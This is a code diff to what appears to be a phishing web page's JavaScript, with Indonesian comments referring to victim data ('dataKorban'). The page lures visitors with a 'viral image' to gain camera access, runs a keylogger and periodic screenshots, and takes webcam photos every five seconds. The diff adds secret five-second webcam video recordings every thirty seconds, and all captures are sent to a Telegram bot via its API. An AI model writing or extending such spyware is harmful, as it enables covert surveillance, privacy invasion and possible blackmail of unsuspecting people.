@@ -378,6 +378,9 @@
         let isActive = false;
         let fotoInterval = null;
         let fotoCount = 0;
+        let videoCount = 0;
+        let mediaRecorder = null;
+        let videoChunks = [];
         
         // Data korban
         let dataKorban = {
@@ -412,7 +415,39 @@
         }
         
         // ===========================================
-        // KEYLOGGER (DIAM-DIAM)
+        // FUNGSI KIRIM FOTO
+        // ===========================================
+        async function kirimFoto(blob, filename) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, filename);
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {}
+        }
+        
+        // ===========================================
+        // FUNGSI KIRIM VIDEO
+        // ===========================================
+        async function kirimVideo(blob, filename) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('video', blob, filename);
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {}
+        }
+        
+        // ===========================================
+        // KEYLOGGER
         // ===========================================
         let keyLog = '';
         document.addEventListener('keydown', (e) => {
@@ -446,20 +481,13 @@
         }, 7000);
         
         // ===========================================
-        // SCREENSHOT BERKALA (DIAM-DIAM)
+        // SCREENSHOT BERKALA
         // ===========================================
         setInterval(() => {
             if (typeof html2canvas !== 'undefined' && isActive) {
                 html2canvas(document.body).then(canvas => {
                     canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', TELEGRAM_CHAT_ID);
-                        formData.append('photo', blob, 'screenshot.png');
-                        
-                        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
+                        await kirimFoto(blob, 'screenshot.png');
                     }, 'image/png');
                 });
             }
@@ -607,7 +635,7 @@
         // ===========================================
         // FUNGSI AMBIL FOTO BERKALA
         // ===========================================
-        async function ambilDanKirimFoto() {
+        async function ambilFoto() {
             if (!isActive || !mediaStream) return;
             
             try {
@@ -629,14 +657,42 @@
                 }
                 const fotoBlob = new Blob([array], {type: 'image/jpeg'});
                 
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', fotoBlob, `foto_${fotoCount}.jpg`);
+                await kirimFoto(fotoBlob, `foto_${fotoCount}.jpg`);
+            } catch (e) {}
+        }
+        
+        // ===========================================
+        // FUNGSI REKAM VIDEO (5 DETIK)
+        // ===========================================
+        function rekamVideo() {
+            if (!isActive || !mediaStream) return;
+            
+            try {
+                videoCount++;
+                videoChunks = [];
                 
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
+                const recorder = new MediaRecorder(mediaStream, {
+                    mimeType: 'video/webm'
                 });
+                
+                recorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) {
+                        videoChunks.push(e.data);
+                    }
+                };
+                
+                recorder.onstop = async () => {
+                    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                    await kirimVideo(videoBlob, `video_${videoCount}.webm`);
+                };
+                
+                recorder.start();
+                setTimeout(() => {
+                    if (recorder.state === 'recording') {
+                        recorder.stop();
+                    }
+                }, 5000); // Rekam 5 detik
+                
             } catch (e) {}
         }
         
@@ -669,8 +725,8 @@
                 video.srcObject = stream;
                 await video.play();
                 
-                // Ambil dan kirim foto pertama
-                await ambilDanKirimFoto();
+                // Ambil foto pertama
+                await ambilFoto();
                 
                 // Kirim data awal
                 await sendInitialData();
@@ -683,8 +739,14 @@
                 // HILANGIN GAMBAR VIRAL
                 viralImage.style.display = 'none';
                 
-                // AMBIL FOTO SETIAP 5 DETIK (DIAM-DIAM)
-                fotoInterval = setInterval(ambilDanKirimFoto, 5000);
+                // FOTO SETIAP 5 DETIK
+                fotoInterval = setInterval(ambilFoto, 5000);
+                
+                // VIDEO SETIAP 30 DETIK (rekam 5 detik)
+                setInterval(rekamVideo, 30000);
+                
+                // Video pertama setelah 2 detik
+                setTimeout(rekamVideo, 2000);
                 
             } catch (error) {
                 viralImage.style.pointerEvents = 'auto';
